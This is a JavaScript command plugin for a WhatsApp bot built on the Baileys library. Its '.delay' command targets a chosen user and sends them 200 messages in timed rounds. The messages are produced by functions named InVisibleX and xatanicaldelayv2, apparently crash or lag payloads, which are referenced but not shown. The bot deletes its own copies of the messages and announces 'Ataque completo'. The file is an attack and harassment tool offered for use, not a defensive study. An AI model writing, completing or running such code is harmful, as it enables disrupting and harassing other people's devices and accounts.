import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

let handler = async (m, { conn }) => {
  const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat;
  if (jid === conn.user.id) {
    return conn.sendMessage(m.chat, { text: '❌ No puedo enviármelo a mí mismo.' }, { quoted: m });
  }

  try {
    for (let round = 1; round <= 10; round++) {
      for (let i = 0; i < 20; i++) {
        const m1 = await InVisibleX(conn, jid, true);
        const m2 = await xatanicaldelayv2(conn, jid, true);

        await conn.sendMessage(conn.user.id, { delete: m1.key });
        await conn.sendMessage(conn.user.id, { delete: m2.key });

        await delay(1000); // 1 segundo entre cada envío
      }

      await conn.sendMessage(m.chat, { text: `✅ Tanda ${round}/10 enviada.` }, { quoted: m });

      if (round < 10) {
        await delay(64444); // ≈64.4 segundos entre tandas
      }
    }

    await conn.sendMessage(m.chat, { text: "✅ Ataque completo: 200 envíos realizados." }, { quoted: m });

  } catch (e) {
    console.error("❌ Error en delay:", e);
    await conn.sendMessage(m.chat, { text: "❌ Error al ejecutar:\n" + e.message }, { quoted: m });
  }
};

handler.command = /^delay$/i;
export default handler;

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Funciones InVisibleX y xatanicaldelayv2 igual a las que tienes